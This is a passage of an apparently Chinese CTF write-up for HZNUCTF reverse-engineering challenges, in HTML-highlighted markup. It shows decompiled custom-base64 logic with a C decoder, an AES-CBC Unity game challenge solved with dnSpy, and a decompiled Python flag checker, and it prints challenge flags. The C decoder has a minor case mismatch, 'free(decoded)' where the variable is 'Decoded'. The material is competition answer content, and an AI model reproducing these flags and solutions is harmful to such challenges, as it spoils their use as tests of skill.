punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n    v21 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int8 <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n  v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v21<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  v22 <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v19 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xF</span><span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_WORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">61</span><span class=\"token punctuation\">;</span>\n  v23 <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> v22 <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">;</span>\n  v24 <span class=\"token operator\">=</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> v22 <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v23 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span>\n    v24 <span class=\"token operator\">=</span> v23<span class=\"token punctuation\">;</span>\n  v9<span class=\"token punctuation\">[</span>v7 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v30<span class=\"token punctuation\">[</span>v24<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> v9<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;time.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>input<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>base64_table <span class=\"token operator\">=</span> <span class=\"token string\">\"GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> reverse_table<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">64</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        reverse_table<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span>base64_table<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    size_t input_len <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    size_t padding <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>input_len <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> input<span class=\"token punctuation\">[</span>input_len <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'='</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        padding<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>input_len <span class=\"token operator\">></span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> input<span class=\"token punctuation\">[</span>input_len <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token char\">'='</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            padding<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    size_t output_len <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>input_len <span class=\"token operator\">*</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token number\">4</span> <span class=\"token operator\">-</span> padding<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>output <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>output_len <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    output<span class=\"token punctuation\">[</span>output_len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n    size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> input_len <span class=\"token operator\">-</span> padding<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> b1<span class=\"token punctuation\">,</span> b2<span class=\"token punctuation\">,</span> b3<span class=\"token punctuation\">,</span> b4<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> v1 <span class=\"token operator\">=</span> reverse_table<span class=\"token punctuation\">[</span>input<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> v2 <span class=\"token operator\">=</span> reverse_table<span class=\"token punctuation\">[</span>input<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> v3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> input_len<span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> reverse_table<span class=\"token punctuation\">[</span>input<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> v4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> input_len<span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> reverse_table<span class=\"token punctuation\">[</span>input<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n        b1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>v1 <span class=\"token operator\">+</span> <span class=\"token number\">64</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        b2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>v2 <span class=\"token operator\">+</span> <span class=\"token number\">64</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        b3 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>v3 <span class=\"token operator\">+</span> <span class=\"token number\">64</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        b4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>v4 <span class=\"token operator\">></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token punctuation\">(</span>v4 <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>v4 <span class=\"token operator\">+</span> <span class=\"token number\">64</span> <span class=\"token operator\">-</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">&lt;</span> output_len<span class=\"token punctuation\">)</span>\n            output<span class=\"token punctuation\">[</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>b1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>b2 <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">&lt;</span> output_len<span class=\"token punctuation\">)</span>\n            output<span class=\"token punctuation\">[</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>b2 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>b3 <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">&lt;</span> output_len<span class=\"token punctuation\">)</span>\n            output<span class=\"token punctuation\">[</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>b3 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> b4<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>output<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Enc<span class=\"token operator\">=</span> <span class=\"token string\">\"AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>Decoded<span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span>Enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> Decoded<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>decoded<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>HZNUCTF{ad162c-2d94-434d-9222-b65dc76a32}</p>\n<h3 id=\"水果忍者\"><a href=\"#水果忍者\" class=\"headerlink\" title=\"水果忍者\"></a>水果忍者</h3><p>主要dll目录：\\水果忍者\\Fruit Ninja_Data\\Managed\\Assembly-CSharp.dll</p>\n<p>拖入dnSpy分析，是AES CBC加密。</p>\n<p><img src=\"/images/1744633170177-5.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>底下有密文、密钥、iv，直接解密即可。</p>\n<p><img src=\"/images/1744633170177-6.png\" alt=\"img\" loading=\"lazy\"></p>\n<p><img src=\"/images/1744633170177-7.png\" alt=\"img\" loading=\"lazy\"></p>\n<p>HZNUCTF{de20-70dd-4e62-b8d0-06e}</p>\n<h3 id=\"蛇年的本命语言\"><a href=\"#蛇年的本命语言\" class=\"headerlink\" title=\"蛇年的本命语言\"></a>蛇年的本命语言</h3><p>python程序解包得到pyc（python 3.8），使用uncompyle6解密得到代码。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> collections <span class=\"token keyword\">import</span> Counter\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to HZNUCTF!!!\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Plz input the flag:\"</span><span class=\"token punctuation\">)</span>\nooo0oOoooOOO0 <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\noOO0OoOoo000 <span class=\"token operator\">=</span> Counter<span class=\"token punctuation\">(</span>ooo0oOoooOOO0<span class=\"token punctuation\">)</span>\nO0o00 <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>oOO0OoOoo000<span class=\"token punctuation\">[</span>oOooo0OOO<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> oOooo0OOO <span class=\"token keyword\">in</span> ooo0oOoooOOO0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ans1: \"</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>O0o00<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">if</span> O0o00 <span class=\"token operator\">!=</span> <span class=\"token string\">\"111111116257645365477364777645752361\"</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wrong_wrong!!!\"</span><span class=\"token punctuation\">)</span>\n    exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\niiIII <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n<span class=\"token keyword\">for</span> oOooo0OOO <span class=\"token keyword\">in</span> ooo0oOoooOOO0<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> oOO0OoOoo000<span class=\"token punctuation\">[</span>oOooo0OOO<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n        iiIII <span class=\"token operator\">+=</span> oOooo0OOO <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>oOO0OoOoo000<span class=\"token punctuation\">[</span>oOooo0OOO<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        oOO0OoOoo000<span class=\"token punctuation\">[</span>oOooo0OOO<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        i11i1Iii1I1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>oOooo0OOO<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> oOooo0OOO <span class=\"token keyword\">in</span> iiIII<span class=\"token punctuation\">]</span>\n        ii1iIi1i11i <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n         <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">504</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">403</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">799</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2938</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">5</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2042</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">7</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1225</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">11</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">22</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">33</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">44</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">55</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">66</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">77</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">7975</span><span class=\"token punctuation\">,</span>\n         <span class=\"token number\">21</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> i11i1Iii1I1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token 